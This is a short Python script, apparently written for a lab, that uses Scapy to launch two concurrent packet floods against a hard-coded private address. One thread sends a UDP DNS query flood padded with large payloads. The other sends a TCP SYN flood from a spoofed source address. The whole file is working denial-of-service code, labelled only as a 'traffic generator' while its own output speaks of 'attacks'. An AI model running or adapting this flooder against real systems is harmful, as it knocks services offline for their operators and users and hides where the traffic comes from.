import time
import threading
from scapy.all import IP, TCP, UDP, DNS, DNSQR, Raw, send

TARGET_IP = "10.10.10.10"
TARGET_DOMAIN = "ns1.eptstech.arpa"
# Set inter=0.001 to send fast packet floods without OS sleeping delays
INTERVAL = 0.001 

def run_udp_flood():
    print("[+] UDP DNS Flood thread started...")
    pkt = IP(dst=TARGET_IP) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=TARGET_DOMAIN)) / Raw(load="A"*620)
    send(pkt, loop=1, inter=INTERVAL, verbose=0)

def run_tcp_flood():
    print("[+] TCP SYN Flood thread started...")
    pkt = IP(src="172.16.1.2", dst=TARGET_IP) / TCP(dport=8000, flags="S")
    send(pkt, loop=1, inter=INTERVAL, verbose=0)

if __name__ == "__main__":
    print("==========================================================")
    print("           SCAPY MULTI-VECTOR TRAFFIC GENERATOR           ")
    print("==========================================================")
    
    t1 = threading.Thread(target=run_udp_flood, daemon=True)
    t2 = threading.Thread(target=run_tcp_flood, daemon=True)

    t1.start()
    t2.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopping attacks...")
